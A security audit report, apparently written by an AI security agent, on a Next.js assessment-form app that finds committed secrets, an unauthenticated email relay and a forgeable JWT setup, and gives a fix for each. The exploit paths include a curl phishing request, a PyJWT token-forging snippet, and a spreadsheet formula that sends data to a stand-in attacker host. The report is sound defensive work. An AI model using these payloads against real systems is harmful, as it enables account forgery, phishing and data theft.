# SECURITY AUDIT REPORT

**Project:** assessmentform-express-spa-multi-step-as  
**Phase:** Express (full application — 10 waves, 1 atomic commit)  
**Mode:** Retroactive STRIDE  
**Audited:** 2026-07-29  
**Auditor:** pivota_spec security agent (claude-sonnet-4-6)  
**Enforcement:** warn  
**threats_open:** 3 (CRITICAL: 1, HIGH: 2), plus 4 lower-severity findings  

---

## Executive Summary

The Multi-Step Assessment Form SPA has solid core security controls: parameterized Drizzle ORM queries throughout, JWT signature validation on every protected route, server-side ownership enforcement on all respondent data paths, and role-based separation between the respondent and system-owner surfaces. No SQL injection or authentication bypass was found in the primary data flows.

Three confirmed findings require remediation before production deployment:

1. **CRITICAL** — `.env` and `.env.local` (containing JWT secrets and DB credentials) are committed to the git repository and tracked in every commit.  
2. **HIGH** — `/api/notifications/email` is a publicly-accessible, unauthenticated HTTP endpoint. Any internet caller can trigger the email relay to send messages to arbitrary addresses.  
3. **HIGH** — `docker-compose.yml` ships a hardcoded, well-known placeholder JWT secret (`change-me-to-a-cryptographically-random-256-bit-value`) which is trivially enumerable; if deployed as-is, all JWTs can be forged.

---

## STRIDE Register

### Attack Surface Enumerated

| Surface Area | Method | Auth Guard |
|---|---|---|
| `POST /api/auth/login` | Email → system_owner JWT | None (public) |
| `POST /api/sessions` | Email/name/team_type → respondent JWT | None (public) |
| `GET /api/sessions/:sessionId` | Session hydration | jwtMiddleware + requireSessionOwner (HOF) |
| `PUT /api/responses/:sessionId` | Auto-save answers | requireSessionOwner (direct) + assessmentOpenGuard |
| `POST /api/submissions/:sessionId` | Finalize submission | requireSessionOwner (direct) + assessmentOpenGuard |
| `GET /api/sections` | Section routing | jwtMiddleware (any role) |
| `GET /api/sections/:sectionId/questions` | Question fetch | jwtMiddleware (any role) |
| `GET /api/config` | View config | requireSystemOwner (direct) |
| `PATCH /api/config` | Update due date | requireSystemOwner (direct) |
| `GET /api/dashboard/responses` | Response list | requireSystemOwner (direct) |
| `GET /api/dashboard/responses/:sessionId` | Response detail | requireSystemOwner (direct) |
| `GET /api/dashboard/analytics` | Analytics data | requireSystemOwner (direct) |
| `GET /api/dashboard/export/csv` | CSV export | requireSystemOwner (direct) |
| `POST /api/notifications/email` | Email trigger | **NONE** |
| `GET /api/health` | Health check | None (public) |

---

## Confirmed Findings

### FIND-01 — CRITICAL — Secrets Committed to Git Repository

| Field | Value |
|---|---|
| **ID** | FIND-01 |
| **Severity** | CRITICAL |
| **STRIDE** | Information Disclosure / Spoofing |
| **File:Line** | `.env:1`, `.env.local:1` (both tracked in git at commit `603993f`) |

**Evidence:**  
`git ls-files` confirms both `.env` and `.env.local` are tracked. `git show HEAD:.env` reveals:
```
JWT_SECRET=uat-test-secret-32-chars-minimum-xxxxxxxx
DATABASE_URL=postgres://assessmentform:assessmentform_dev_password@localhost:5432/assessmentform
```
Neither file appears in `.gitignore` (confirmed by reading `.gitignore` — the file only ignores `.env` patterns for `node_modules/` and framework build artifacts, not root-level `.env*` files).

**Exploit Path:**  
Any user with git clone/pull access to the repository has the `JWT_SECRET`. With a known secret and the HS256 signing logic in `authService.ts:20`, an attacker can forge a `system_owner` JWT for any email, bypassing the `isSystemOwnerEmail` database check entirely and gaining full access to all dashboard endpoints, CSV export of all respondent PII, and the config PATCH endpoint.

**Refutation attempt:**  
The secret `uat-test-secret-32-chars-minimum-xxxxxxxx` appears to be a UAT/test value, not a production secret. However: (a) it is committed to the main development branch that drives the CI/deployment pipeline; (b) the docker-compose also ships a different but equally predictable placeholder; (c) if the same secret is used in any deployed environment, all tokens can be forged.

**Fix:**  
1. Immediately add `.env` and `.env.local` to `.gitignore`.  
2. Rotate the JWT secret and database password in all deployed environments.  
3. Consider purging the secret from git history (`git filter-repo` or BFG).  
4. Add a pre-commit hook or CI check (e.g., `git-secrets`, `trufflehog`) to prevent secret commits.

---

### FIND-02 — HIGH — Unauthenticated Email Relay Endpoint

| Field | Value |
|---|---|
| **ID** | FIND-02 |
| **Severity** | HIGH |
| **STRIDE** | Spoofing / Elevation of Privilege |
| **File:Line** | `src/app/api/notifications/email/route.ts:25` |

**Evidence:**  
`POST /api/notifications/email` has zero authentication. The route handler directly calls `sendSubmissionConfirmation(parsed.data)` where `params.email` is taken verbatim from the request body. No call to `requireSystemOwner`, `jwtMiddleware`, or any other auth guard is present. Confirmed by searching for auth patterns in the file — count returned 0.

```typescript
// route.ts:25 — no auth guard before this
export async function POST(request: NextRequest) {
  // ... parses body and calls sendSubmissionConfirmation directly
}
```

`emailService.ts:39` shows the relay POSTs to `EMAIL_RELAY_URL` with `to: params.email` drawn directly from the request.

**Exploit Path:**  
When `EMAIL_RELAY_URL` is configured (production deployment with email notifications enabled):
```bash
curl -X POST https://your-app/api/notifications/email \
  -H "Content-Type: application/json" \
  -d '{"session_id":"00000000-0000-0000-0000-000000000000","email":"victim@example.com","name":"Phisher","due_date":"2026-12-31"}'
```
This sends a legitimate-looking "Assessment Submitted — Developer Platform Evaluation" email to any target address, using the application's email relay and `from` address. When `EMAIL_RELAY_URL` is not set the endpoint is a no-op, but the endpoint still accepts and processes the request publicly.

**Refutation attempt:**  
The comment says "Internal server-to-server only." However, Next.js API routes have no network-layer isolation; there is no IP allowlist, no shared secret header, no service mesh authentication. The endpoint is equally reachable by external callers as by internal ones. In practice, `sendSubmissionConfirmation` is also called directly from `submissionService.ts:58` without going through this HTTP route, so the HTTP endpoint is redundant and serves no necessary purpose.

**Fix:**  
Option A (preferred): Remove `POST /api/notifications/email` entirely. Internal callers already invoke `emailService.sendSubmissionConfirmation()` directly.  
Option B: Add `requireSystemOwner` or a shared internal secret header validated server-side.

---

### FIND-03 — HIGH — Hardcoded Weak JWT Secret in docker-compose.yml

| Field | Value |
|---|---|
| **ID** | FIND-03 |
| **Severity** | HIGH |
| **STRIDE** | Spoofing |
| **File:Line** | `docker-compose.yml:31` |

**Evidence:**  
```yaml
JWT_SECRET: change-me-to-a-cryptographically-random-256-bit-value
```
This placeholder is committed as the default value for the production service definition. If a deployment team runs `docker-compose up` without overriding this value, all JWT signatures will use a publicly known, trivially guessable string.

**Exploit Path:**  
An attacker who knows this default value (from the public repository) can forge valid `system_owner` JWTs:
```python
import jwt  # PyJWT
token = jwt.encode({"session_id": None, "email": "attacker@example.com", "role": "system_owner"}, 
                   "change-me-to-a-cryptographically-random-256-bit-value", algorithm="HS256")
```
This token passes all `requireSystemOwner` checks, granting full dashboard access.

**Refutation attempt:**  
`authService.ts:8-10` validates that `JWT_SECRET` is present (throws if absent), but does not validate minimum entropy or reject the placeholder value. Deployment teams following the compose file as-written will ship a broken-by-design secret.

**Fix:**  
1. Remove `JWT_SECRET` from `docker-compose.yml` entirely; require it as an external secret (Docker secret, environment injection, `.env` file not committed).  
2. Add a startup check in `authService.ts` that rejects well-known placeholder strings (or enforces minimum length ≥ 32 bytes).  
3. Add a `# REQUIRED: Generate with: openssl rand -hex 32` comment and fail fast if unchanged.

---

## Lower-Severity Findings

### FIND-04 — MEDIUM — No Server-Side Validation That question_id Belongs to Session's Assigned Sections

| Field | Value |
|---|---|
| **ID** | FIND-04 |
| **Severity** | MEDIUM |
| **STRIDE** | Tampering |
| **File:Line** | `src/app/api/responses/[sessionId]/route.ts:54-66`, `src/lib/services/responseService.ts:15-41` |

**Evidence:**  
`PUT /api/responses/:sessionId` validates the JWT and session ownership, but does not check that each submitted `question_id` belongs to a section in the respondent's `section_ids_ordered`. The `upsertResponses` service inserts any question UUID that passes Zod validation and satisfies the FK constraint (`question_id` → `questions.id`). Section membership is enforced only client-side.

**Exploit Path:**  
A respondent for team type `program_project` (assigned sections A, B, C) can craft a PUT request with `question_id` values from section D (a `platform_engineering`-only section), injecting answers for questions they were never shown. These answers appear in the dashboard under their session and are included in analytics aggregations, polluting cross-team analytics data.

**Refutation attempt:**  
Confirmed: no join between `session.section_ids_ordered` and `questions.section_id` exists in `responseService.ts`. The FK only ensures the question exists globally, not that it belongs to the respondent's routing.

**Fix:**  
In `upsertResponses`, load `session.section_ids_ordered` and verify each `question_id` belongs to one of those sections before insert.

---

### FIND-05 — MEDIUM — CSV Export: No Formula Injection Defense

| Field | Value |
|---|---|
| **ID** | FIND-05 |
| **Severity** | MEDIUM |
| **STRIDE** | Tampering (downstream — targets spreadsheet users) |
| **File:Line** | `src/lib/services/csvExportService.ts:134-139` |

**Evidence:**  
`csv-stringify` is invoked with no options:
```typescript
stringify([row], (err, output) => { ... })
```
The default `csv-stringify` configuration does not escape or prefix formula-triggering characters (`=`, `@`, `+`, `-`, `\t`, `\r`). Free-text answers (`free_text_short` / `free_text_long`) can contain arbitrary strings up to 500/2000 characters.

**Exploit Path:**  
A respondent submits `=HYPERLINK("http://attacker.example/steal?d="&A1,"Click here")` as a free_text answer. When a system owner downloads and opens the CSV in Microsoft Excel or LibreOffice Calc, the formula executes in the spreadsheet context.

**Refutation attempt:**  
`flattenAnswerPayload` passes free_text values through `String(p.value ?? '')` without sanitization. The `csv-stringify` call confirms no `cast` or custom quote functions are configured.

**Fix:**  
Add a sanitization step in `flattenAnswerPayload` (or as a `cast` option to `csv-stringify`) that prepends a single quote (`'`) to any string beginning with `=`, `@`, `+`, `-`, `\t`, or `\r`.

---

### FIND-06 — LOW — PostgreSQL Port 5432 Exposed to Host in docker-compose.yml

| Field | Value |
|---|---|
| **ID** | FIND-06 |
| **Severity** | LOW |
| **STRIDE** | Elevation of Privilege |
| **File:Line** | `docker-compose.yml:19-20` |

**Evidence:**  
```yaml
ports:
  - "5432:5432"
```
The database port is bound to all host interfaces. With the hardcoded credentials (`assessmentform` / `assessmentform_dev_password`) visible in the compose file, any network-adjacent host (or any host if deployed on a public IP without a firewall) can connect directly to the database.

**Fix:**  
Remove the `ports` mapping from the `db` service; the `app` service accesses `db` over the Docker network without host-level port exposure. If direct DB access is needed for development, use `127.0.0.1:5432:5432`.

---

### FIND-07 — LOW — JWT Tokens Stored in localStorage (XSS Exposure)

| Field | Value |
|---|---|
| **ID** | FIND-07 |
| **Severity** | LOW |
| **STRIDE** | Information Disclosure |
| **File:Line** | `src/app/page.tsx:25,48`, `src/app/dashboard/login/page.tsx:42`, `src/app/(assessment)/assessment/page.tsx:19` |

**Evidence:**  
Both the respondent JWT (`af_token`) and the system-owner JWT (`dashboard_token`) are stored in `localStorage`. Any successful XSS attack on the application origin can read both tokens, allowing full impersonation.

**Note:** The application does not use `httpOnly` cookies for token storage. The security headers in `next.config.ts` include `X-Content-Type-Options` and `Referrer-Policy` but no `Content-Security-Policy`.

**Refutation attempt:**  
No `eval()`, `dangerouslySetInnerHTML`, or dynamic `innerHTML` assignment was found in a cursory search of the frontend code, suggesting low XSS surface. However, third-party dependencies and future code changes make `localStorage` a structural risk. The absence of a `Content-Security-Policy` header reduces the defense-in-depth available.

**Fix:**  
Migrate token storage to `httpOnly; Secure; SameSite=Strict` cookies. Add a `Content-Security-Policy` header to `next.config.ts`.

---

## Verified-Safe Items

| Area | STRIDE | Verdict | Evidence |
|---|---|---|---|
| SQL injection via Drizzle ORM | Tampering | SAFE | All queries use parameterized Drizzle builder; raw `sql\`...\`` tagged templates use `${variable}` binding, not string concatenation. `authService.ts:42`, `analyticsService.ts:91-108`. |
| IDOR on `GET /api/sessions/:sessionId` | Information Disclosure | SAFE | `requireSessionOwner` HOF checks `respondent_email.toLowerCase() === req.user.email.toLowerCase()` before calling `getSessionById`, which performs a second ownership check. `auth/requireSessionOwner.ts:38`, `sessionService.ts:196`. |
| System owner submitting assessments as respondent | Elevation of Privilege | SAFE | `middleware/requireSessionOwner.ts:65-70` explicitly rejects `system_owner` role with `SYSTEM_OWNER_CANNOT_SUBMIT`. |
| Respondent accessing dashboard | Elevation of Privilege | SAFE | All five dashboard routes call `middleware/requireSystemOwner.ts` which verifies `role === 'system_owner'` after signature verification. |
| JWT forgery (without known secret) | Spoofing | SAFE | `jose` library used with `algorithms: ['HS256']` restriction; `verifyJwt` always calls `jwtVerify` with the server-side secret. |
| Session resume IDOR | Information Disclosure | SAFE | `getSessionById` double-checks `respondent_email !== callerEmail` independently of middleware. `sessionService.ts:196-198`. |
| Config PATCH without auth | Tampering | SAFE | Both `GET /api/config` and `PATCH /api/config` call `requireSystemOwner` before any DB access. `config/route.ts:9,34`. |
| Dashboard CSV export without auth | Information Disclosure | SAFE | `GET /api/dashboard/export/csv` calls `requireSystemOwner` before building the stream. `dashboard/export/csv/route.ts:9`. |
| Sections/questions data leakage to unauthenticated users | Information Disclosure | SAFE | Both section routes require a valid JWT via `jwtMiddleware` (any role). |
| System Owner email enumeration via login response timing | Information Disclosure | SAFE | Both success (JWT issued) and failure (`NOT_A_SYSTEM_OWNER` 403) paths call `isSystemOwnerEmail` before branching; response body is structurally different but response timing is not artificially equalized. (Minor: email existence oracle exists via 403 vs 200, but within acceptable risk for this use case.) |
| Answer payload type confusion | Tampering | SAFE | `PutResponsesBodySchema` uses Zod discriminated union on `type` field; all six types are validated with specific constraints. `answerPayload.ts:47-54`. |
| assessmentOpenGuard bypass via DB fail-open | Denial of Service / Tampering | LOW RISK | Fail-open returns `{ ok: true }` on DB errors, but the subsequent `upsertResponses`/`finalizeSubmission` calls would also fail on DB errors. Practical bypass is not achievable via this path alone. |
| Unbounded dashboard query results | Denial of Service | SAFE | `dashboardService.ts:21` enforces `pageSize = Math.min(100, ...)`. CSV export fetches all rows but is system_owner-only. |
| `Content-Disposition` header injection in CSV filename | Tampering | SAFE | CSV filename is `assessment-responses-YYYY-MM-DD.csv` built from `new Date().toISOString().slice(0,10)` — no user input. `dashboard/export/csv/route.ts:14`. |
| Path traversal in sectionId | Tampering | SAFE | `sectionId` is a text slug used only in `eq(sections.id, sectionId)` — parameterized. No filesystem operations on this value. |

---

## Summary Table

| ID | Severity | STRIDE | file:line | One-Line Description |
|---|---|---|---|---|
| FIND-01 | **CRITICAL** | Info Disclosure / Spoofing | `.env:1`, `.env.local:1` | JWT secret and DB credentials committed to git |
| FIND-02 | **HIGH** | Spoofing | `api/notifications/email/route.ts:25` | Unauthenticated email relay endpoint |
| FIND-03 | **HIGH** | Spoofing | `docker-compose.yml:31` | Hardcoded placeholder JWT secret shipped in compose |
| FIND-04 | MEDIUM | Tampering | `api/responses/[sessionId]/route.ts:54` | No server-side section-membership check for question_id |
| FIND-05 | MEDIUM | Tampering | `services/csvExportService.ts:134` | CSV formula injection in free-text answers |
| FIND-06 | LOW | EoP | `docker-compose.yml:19` | PostgreSQL port exposed to host |
| FIND-07 | LOW | Info Disclosure | `app/page.tsx:25`, `dashboard/login/page.tsx:42` | JWTs stored in localStorage, no CSP |

---

## Remediation Priority

1. **Immediately (pre-deploy):** FIND-01 — Remove `.env`/`.env.local` from git tracking; rotate all secrets.  
2. **Immediately (pre-deploy):** FIND-03 — Remove hardcoded JWT_SECRET from `docker-compose.yml`; require injection at runtime.  
3. **Before enabling email:** FIND-02 — Delete or authenticate the `/api/notifications/email` route.  
4. **Sprint:** FIND-04 — Add server-side section-membership validation in `responseService.upsertResponses`.  
5. **Sprint:** FIND-05 — Add formula-injection prefix escaping in `csvExportService.flattenAnswerPayload`.  
6. **Hardening:** FIND-06 — Remove PostgreSQL port host-binding from `docker-compose.yml`.  
7. **Hardening:** FIND-07 — Migrate JWTs to `httpOnly` cookies; add `Content-Security-Policy` header.
